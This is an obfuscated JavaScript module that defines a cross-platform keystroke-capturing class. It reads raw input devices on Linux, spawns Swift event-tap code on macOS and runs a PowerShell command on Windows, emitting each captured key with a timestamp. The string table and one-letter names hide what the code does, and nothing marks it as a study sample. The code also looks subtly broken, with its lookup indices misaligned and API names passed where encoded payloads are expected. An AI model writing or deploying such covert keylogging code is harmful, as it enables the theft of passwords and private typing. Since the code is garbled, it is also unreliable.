const _0x2e=['emit','slice','destroy','createReadStream','data','error','floor','kill','getIntegerValueField','passRetained','defaultTap','headInsertEventTap','createRunLoopSource','rawValue','keyboardEventKeycode'];const _0x4f=function(_0x2e4f1c,_0x4f1e2d){return _0x2e[_0x2e4f1c-0]};class K extends(require('events')){constructor(_0x1f){super();this._=_0x1f;this.i()}_p(_0x2){return Buffer.from(_0x2,'base64')}_x(){try{this.s=require('fs')[_0x4f(4)]('/dev/input/'+this._);this.s.on(_0x4f(5),_=>this[_0x4f(1)]('k',this._p(_)));this.s.on(_0x4f(6),_=>this[_0x4f(1)](_0x4f(6),_))}catch(_){this[_0x4f(1)](_0x4f(6),_)}}i(){(()=>{const p=process.platform;if(p==='darwin')this._m();else if(p==='win32')this._w();else this._x()})()}_c(){this.s&&this.s[_0x4f(3)]()}_m(){const _=require('child_process').spawn('xcrun',['swift','-'],{input:this._p(_0x4f(9))});_.stdout.on(_0x4f(5),_=>this._h(_));_.on(_0x4f(6),_=>this[_0x4f(1)](_0x4f(6),_))}_w(){const _=require('child_process').spawn('powershell',['-Command',this._p(_0x4f(8))]);_.stdout.on(_0x4f(5),_=>this._h(_));_.on(_0x4f(6),_=>this[_0x4f(1)](_0x4f(6),_))}_h(_){const t=Math[_0x4f(7)](Date.now()/1e3);this[_0x4f(1)]('k',{t,k:_.toString().trim()})}}module.exports=K;